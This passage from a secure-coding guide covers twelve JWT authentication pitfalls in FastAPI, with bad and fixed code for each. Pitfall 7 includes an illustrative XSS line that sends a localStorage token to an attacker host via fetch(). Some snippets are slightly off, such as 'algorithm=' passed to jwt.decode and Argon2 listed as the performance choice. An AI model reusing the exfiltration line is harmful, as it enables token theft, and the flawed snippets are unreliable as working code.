# SECRET_KEY=dev_key_for_testing_only_1234567890

# Production (set in deployment):
# export SECRET_KEY=$(python -c 'import secrets; print(secrets.token_urlsafe(32))')
```

#### How to generate a secure key:
```python
import secrets

# Generate random key
key = secrets.token_urlsafe(32)
print(key)
# Output: "jR8q_v3-L2Z9X5K1p0M7n6Y4w2u8T3A9b1C5d6F7g8"
```

### Pitfall 2: Storing Password in Response

#### The Problem:
```python
# ✗ BAD - Exposes password hash!
@app.get("/users/me", response_model=User)
def get_profile(current_user: User = Depends(get_current_user)):
    return current_user  # Includes hashed_password field

# Response includes:
# {
#   "id": 5,
#   "username": "alice",
#   "hashed_password": "$2b$12$..."  # Should never be sent!
# }

# Why this is bad:
# 1. Exposes password hash (even though unhashable)
# 2. Violates least privilege principle
# 3. Extra data on wire
```

#### The Solution:
```python
# ✓ GOOD - Exclude password from response model
from pydantic import BaseModel

# Database model (includes everything)
class UserDB(BaseModel):
    id: int
    username: str
    email: str
    hashed_password: str  # Database column

# Response model (excludes sensitive fields)
class UserResponse(BaseModel):
    id: int
    username: str
    email: str
    
    # No hashed_password field!

@app.get("/users/me", response_model=UserResponse)
def get_profile(current_user: UserDB = Depends(get_current_user)):
    return current_user  # FastAPI automatically excludes hashed_password
    # Response only includes: id, username, email
```

### Pitfall 3: Not Checking if User Still Exists

#### The Problem:
```python
# ✗ BAD - User deleted but token still works!
def get_current_user(token: str = Depends(oauth2_scheme)):
    user_id = verify_token(token)
    # No database lookup!
    # What if user was deleted?
    # Or banned?
    return {"user_id": user_id}

# Scenario:
# 1. Alice has valid token
# 2. Admin deletes Alice's account
# 3. Alice's old token still works
# 4. Alice can access API with deleted account!
```

#### The Solution:
```python
# ✓ GOOD - Always verify user exists
def get_current_user(token: str = Depends(oauth2_scheme)):
    user_id = verify_token(token)
    
    user = db.get_user(user_id)  # Database lookup!
    
    if user is None:
        raise HTTPException(status_code=401, detail="User not found")
    
    if user.is_deleted:  # Check if account is active
        raise HTTPException(status_code=401, detail="Account deleted")
    
    if user.is_banned:  # Check if account is banned
        raise HTTPException(status_code=403, detail="Account banned")
    
    return user
```

### Pitfall 4: Not Setting Token Expiration

#### The Problem:
```python
# ✗ BAD - Token never expires!
def create_access_token(data: dict):
    return jwt.encode(data, SECRET_KEY, algorithm="HS256")
    # No expiration! 
    # If token leaked, attacker has access forever
```

#### The Solution:
```python
# ✓ GOOD - Always set expiration
from datetime import datetime, timedelta

def create_access_token(data: dict, expires_delta: timedelta = None):
    to_encode = data.copy()
    
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)  # Default
    
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm="HS256")

# Usage:
token = create_access_token(
    data={"sub": user_id},
    expires_delta=timedelta(minutes=30)
)
```

### Pitfall 5: Wrong Error Messages Leaking Information

#### The Problem:
```python
# ✗ BAD - Tells attacker too much!
@app.post("/token")
def login(username: str, password: str):
    user = db.get_user_by_username(username)
    
    if user is None:
        raise HTTPException(status_code=401, detail="User not found")
        # Attacker learns: username doesn't exist
        # Can enumerate all usernames!
    
    if not verify_password(password, user.hashed_password):
        raise HTTPException(status_code=401, detail="Wrong password")
        # Attacker learns: username exists, password wrong
        # Can enumerate valid usernames!
```

#### The Solution:
```python
# ✓ GOOD - Generic error message
@app.post("/token")
def login(username: str, password: str):
    user = db.get_user_by_username(username)
    
    # Don't distinguish between "user not found" and "wrong password"
    if user is None or not verify_password(password, user.hashed_password):
        raise HTTPException(
            status_code=401,
            detail="Invalid credentials"  # Generic!
        )
    
    # Attacker can't tell if username exists or password is wrong
    # Takes longer to enumerate valid usernames
```

### Pitfall 6: Sending Token in URL Instead of Header

#### The Problem:
```python
# ✗ BAD - Token visible in browser history!
GET /api/data?token=eyJhbGc...

# Problems:
# 1. Token in browser history
# 2. Token in server logs
# 3. Token in referrer headers (sent to other sites!)
# 4. Visible if someone looks at screen
```

#### The Solution:
```python
# ✓ GOOD - Token in Authorization header
GET /api/data
Authorization: Bearer eyJhbGc...

# Advantages:
# 1. Not logged by default
# 2. Not in browser history
# 3. Not in referrer headers
# 4. Only sent to HTTPS (encrypted)
```

### Pitfall 7: Storing Token in localStorage (XSS Risk)

#### The Problem:
```javascript
// ✗ BAD - localStorage is accessible to JavaScript
localStorage.setItem('token', response.access_token);

// If attacker injects JavaScript:
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + token);
// Token stolen!
```

#### The Solution:
```javascript
// ✓ GOOD - HttpOnly cookies (not accessible to JavaScript)
// Server sets:
Set-Cookie: access_token=eyJhbGc...; HttpOnly; Secure; SameSite=Strict

// JavaScript can't read it:
const token = document.cookie;  // Can't access HttpOnly cookies
// Even if XSS attack runs JavaScript, token is safe

// Browser automatically includes in requests:
fetch('/api/data');  // Includes access_token cookie automatically
```

**Trade-offs:**
| Storage | XSS Risk | CSRF Risk | Server-side |
|---------|----------|-----------|------------|
| localStorage | High | Low | No |
| SessionStorage | High | Low | No |
| HttpOnly Cookie | Low | High | Yes |
| HttpOnly + SameSite | Low | Low | Yes |

### Pitfall 8: Not Validating Token Signature

#### The Problem:
```python
# ✗ BAD - Doesn't verify signature!
import base64
import json

def decode_token_wrong(token: str):
    # Just base64 decode without verification!
    parts = token.split(".")
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    return payload

# This is vulnerable!
# Attacker can forge any token:
# 1. Create payload: {"sub": "admin"}
# 2. Base64 encode it
# 3. Paste into token
# 4. Server decodes it without checking signature
# 5. Attacker is now "admin"
```

#### The Solution:
```python
# ✓ GOOD - Always verify signature
from jose import jwt, JWTError

def decode_token_correct(token: str):
    try:
        # Verifies signature with SECRET_KEY!
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return payload
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

# Now attacker can't forge tokens:
# They don't have SECRET_KEY
# Signature won't match
```

### Pitfall 9: Using Weak Secret Key

#### The Problem:
```python
# ✗ BAD - Weak secrets (easy to brute force)
SECRET_KEY = "password"           # Dictionary word
SECRET_KEY = "12345678"          # Common pattern
SECRET_KEY = "changeme"          # Default-like
SECRET_KEY = "secret123"         # Too short
```

#### The Solution:
```python
# ✓ GOOD - Strong random secrets
import secrets

# Generate strong key (256 bits = 32 bytes)
SECRET_KEY = secrets.token_urlsafe(32)
# Output: "jR8q_v3-L2Z9X5K1p0M7n6Y4w2u8T3A9b1C5d6F7g8h5i2j0k"

# Minimum recommendations:
# - Length: 32+ characters
# - Entropy: Mix of upper, lower, numbers, special chars
# - Randomness: Generated with cryptographic RNG
# - Uniqueness: Different per environment/deployment

# How long to brute force?
# 20-char random string: ~10^36 possibilities
# Even with 1 trillion attempts/sec: 10^21 seconds = impossible
```

### Pitfall 10: Not Handling Token Refresh

#### The Problem:
```python
# ✗ BAD - User forced to re-login every 15 minutes
ACCESS_TOKEN_EXPIRE_MINUTES = 15

# User experience:
# 1. User works
# 2. 15 minutes pass
# 3. BOOM: "Your session expired, please login again"
# 4. User angry, finds competitor
```

#### The Solution:
```python
# ✓ GOOD - Implement refresh token flow
ACCESS_TOKEN_EXPIRE_MINUTES = 15    # Short-lived
REFRESH_TOKEN_EXPIRE_DAYS = 7       # Long-lived

@app.post("/token/refresh")
def refresh_token(refresh_token: str):
    """Get new access_token using refresh_token."""
    payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
    
    user_id = payload.get("sub")
    if user_id is None:
        raise HTTPException(status_code=401, detail="Invalid token")
    
    # Create new short-lived access token
    new_token = create_access_token(
        data={"sub": user_id},
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    
    return {"access_token": new_token}

# Client logic:
# 1. Store both access_token and refresh_token
# 2. Use access_token for API calls
# 3. When access_token expires:
#    - Use refresh_token to get new access_token
#    - Retry original request
# 4. User doesn't notice! Seamless background refresh
```

### Pitfall 11: Mixing Up HS256 and RS256

#### The Problem:
```python
# ✗ BAD - Using wrong algorithm
# HS256: HMAC (symmetric) - same key for signing and verifying
# RS256: RSA (asymmetric) - private key for signing, public key for verifying

# If using HS256 but treating public_key as symmetric key:
SECRET_KEY = "my_secret"  # Think this is private
jwt.encode(data, SECRET_KEY, algorithm="HS256")  # Signed with "my_secret"

# But if you think this is RS256:
public_key = load_public_key()
jwt.decode(token, public_key, algorithms=["RS256"])  # FAILS!
# public_key != SECRET_KEY
```

#### The Solution:
```python
# ✓ GOOD - Choose consistently based on architecture

# Small deployment (single server):
# Use HS256 (simpler)
from jose import jwt
SECRET_KEY = "symmetric_secret_key"
jwt.encode(data, SECRET_KEY, algorithm="HS256")
jwt.decode(token, SECRET_KEY, algorithm="HS256")

# Large deployment (multiple servers):
# Use RS256 (one server signs, many verify)
# Private key (kept secret, only on signing server):
private_key = load_private_key("private.pem")
jwt.encode(data, private_key, algorithm="RS256")

# Public key (distributed to all servers):
public_key = load_public_key("public.pem")
jwt.decode(token, public_key, algorithm="RS256")
```

### Pitfall 12: Accepting Token from Wrong Source

#### The Problem:
```python
# ✗ BAD - Takes token from anywhere
def get_current_user(token: str = Depends(oauth2_scheme)):
    # Doesn't check where token came from
    # Could be from GET param (CSRF risk)
    # Could be from cookie (CSRF risk)
    # Could be from malicious header
    
    return jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
```

#### The Solution:
```python
# ✓ GOOD - Accept only from Authorization header
from fastapi.security import OAuth2PasswordBearer

oauth2_scheme = OAuth2PasswordBearer(
    tokenUrl="token",
    # Enforces: Authorization: Bearer <token> format
    # Rejects tokens from other sources
)

def get_current_user(token: str = Depends(oauth2_scheme)):
    # FastAPI already extracted from Authorization header
    # Rejected malformed formats
    # Safe to decode
    return jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
```

---

## Quick Reference

### Security Checklist
- [ ] SECRET_KEY from environment variable (never hardcoded)
- [ ] Password hashing using bcrypt (never plaintext)
- [ ] Token expiration set (recommend 15-30 minutes)
- [ ] Token in Authorization header (not URL params)
- [ ] User existence verified before using token
- [ ] Signature always verified (never skip)
- [ ] Generic error messages (don't reveal if username exists)
- [ ] HTTPS enforced in production (tokens encrypted in transit)
- [ ] HttpOnly cookies if storing tokens (prevents XSS access)
- [ ] Refresh token implemented (for better UX)

### Algorithm Decision Tree
```
Single server?
├─ YES → Use HS256 (symmetric, simpler)
└─ NO → Use RS256 (asymmetric, scalable)

Token lifetime?
├─ User interactive → 15-30 minutes
├─ Background tasks → 1-24 hours
└─ Long-lived session → 7-30 days (use refresh tokens)

Password hashing?
├─ New application → Bcrypt cost 12
├─ Performance critical → Argon2 (slower, more secure)
└─ Legacy → Check what's already used

Storage location?
├─ Web app → HttpOnly cookie
├─ Mobile app → Secure storage
└─ CLI app → OS keychain
```

### Implementation Order
1. Set up password hashing first (test independently)
2. Implement token creation/decoding (test independently)
3. Add database models and ORM setup
4. Create login endpoint (integrate 1+2)
5. Create dependency for protected endpoints (use 2)
6. Implement refresh token flow
7. Add comprehensive tests
8. Add rate limiting (prevent brute force)
9. Add logging/monitoring (detect suspicious activity)
10. Security audit

---

## Additional Resources

### Learning Resources
- JWT.io: Decode and understand JWT tokens
- OWASP Authentication Cheat Sheet
- NIST Password Guidelines (NIST 800-63B)
- FastAPI Security Documentation

### Testing Tools
- Postman: Manual API testing
- Thunder Client (VSCode): Lightweight API testing
- httpie: Command-line HTTP client
- curl: Quick testing

### Monitoring & Debugging
- Log all authentication attempts
- Alert on repeated failed logins
- Monitor for suspicious token usage patterns
- Regular security audits

---

## Summary

JWT authentication provides a stateless, scalable way to secure APIs. The key components are:

1. **Password Hashing**: Bcrypt converts plaintext passwords to irreversible hashes
2. **Token Creation**: Sign data with a secret to create self-contained proof of identity
3. **Token Validation**: Verify signature and expiration to ensure authenticity
4. **Dependency Injection**: Use FastAPI's dependency system to enforce protection on endpoints

The most common mistakes involve:
- Weak secrets or exposed keys
- Missing validations (signatures, user existence)
- Poor error messages revealing information
- No token expiration or refresh mechanism

Following this guide and the security checklist will give you a robust, production-ready authentication system suitable for learning and real applications.

Happy secure coding!
